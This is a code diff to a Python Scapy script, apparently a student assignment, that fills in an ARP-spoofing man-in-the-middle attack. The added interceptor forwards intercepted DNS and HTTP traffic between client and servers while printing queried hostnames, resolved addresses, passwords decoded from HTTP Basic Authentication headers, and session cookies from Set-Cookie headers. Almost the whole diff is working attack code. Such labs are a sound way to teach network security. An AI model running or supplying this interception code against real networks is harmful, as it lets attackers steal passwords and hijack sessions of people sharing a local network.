@@ -5,6 +5,9 @@ import sys
 import threading
 import time
 
+# Include the base64 library to decode the http basic authentication
+import base64
+
 def parse_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
@@ -43,19 +46,124 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
     arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
-    sr1(arp_pack, timeout=10)
+    send(arp_pack)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
     arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
-    sr1(arp_pack, timeout=10)
+    send(arp_pack)
 
 
 # TODO: handle intercepted packets
 def interceptor(packet):
-    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+	global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+	# The packet should only be intercepted if it's caused from a spoofed ARP table
+	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP:
+		#packet.show()
+		if packet.haslayer(DNS):
+			if packet.getlayer(DNS).qr == 0:
+				debug(f"The above packet is a DNS request packet!")
+				# Extract the hostname from this packet
+				hostname = packet.getlayer(DNS).qd.qname.decode('ascii')
+				print("*hostname:" + hostname)
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = dnsServerMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(DNS).qr == 1:
+				debug(f"The above packet is a DNS response packet!")
+				# Extract the hostaddr from this packet
+				hostaddr = packet.getlayer(DNS).an.rdata
+				print("*hostaddr:" + hostaddr)
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				#packet.show()
+				sendp(packet)
+		elif packet.haslayer(TCP):
+			if packet.getlayer(TCP).flags == "S":
+				debug(f"The above packet is an HTTP SYN packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = httpServerMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(TCP).flags == "SA":
+				debug(f"The above packet is an HTTP SYN+ACK packet!")
+				# Change the MAC addresses
+				packet.getlayer(Ether).src = attackerMAC
+				packet.getlayer(Ether).dst = clientMAC
+				#packet.show()
+				sendp(packet)
+			elif packet.getlayer(TCP).flags == "A":
+				if packet.getlayer(Ether).src == clientMAC:
+					debug(f"The above packet is an HTTP ACK packet from client!")
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = httpServerMAC
+					#packet.show()
+					sendp(packet)
+				elif packet.getlayer(Ether).src == httpServerMAC:
+					debug(f"The above packet is an HTTP ACK packet from web server!")
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = clientMAC
+					#packet.show()
+					sendp(packet)
+			elif packet.getlayer(TCP).flags == "PA":
+				if packet.getlayer(Ether).src == clientMAC:
+					debug(f"The above packet is an HTTP request packet!")
+					# Extract the basicauth from this packet
+					basicauth = packet.getlayer(Raw).load.decode('ascii')
+					start_index = basicauth.find("Authorization: Basic ")+21
+					end_index = basicauth.find("User-Agent")-2
+					basicauth = basicauth[start_index:end_index]
+					basicauth = base64.b64decode(basicauth).decode('ascii')
+					pass_index = basicauth.find(":")
+					basicauth = basicauth[pass_index+1:]
+					print("*basicauth:" + basicauth)
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = httpServerMAC
+					#packet.show()
+					sendp(packet)
+				elif packet.getlayer(Ether).src == httpServerMAC:
+					debug(f"The above packet is an HTTP response packet!")
+					# Extract the cookie from this packet
+					cookie = packet.getlayer(Raw).load.decode('ascii')
+					start_index = cookie.find("Set-Cookie: ")+12
+					end_index = cookie.find("Accept-Ranges:")-2
+					cookie = cookie[start_index:end_index]
+					print("*cookie:" + cookie)
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = clientMAC
+					#packet.show()
+					sendp(packet)
+			elif packet.getlayer(TCP).flags == "FA":
+				if packet.getlayer(Ether).src == clientMAC:
+					debug(f"The above packet is an HTTP FIN+ACK packet from client!")
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = httpServerMAC
+					#packet.show()
+					sendp(packet)
+				elif packet.getlayer(Ether).src == httpServerMAC:
+					debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
+					# Change the MAC addresses
+					packet.getlayer(Ether).src = attackerMAC
+					packet.getlayer(Ether).dst = clientMAC
+					#packet.show()
+					sendp(packet)
+"""
+print("*hostname:")
+print("*hostaddr:")
+print("*basicauth:")
+print("*cookie:")
+"""
 
 
 if __name__ == "__main__":
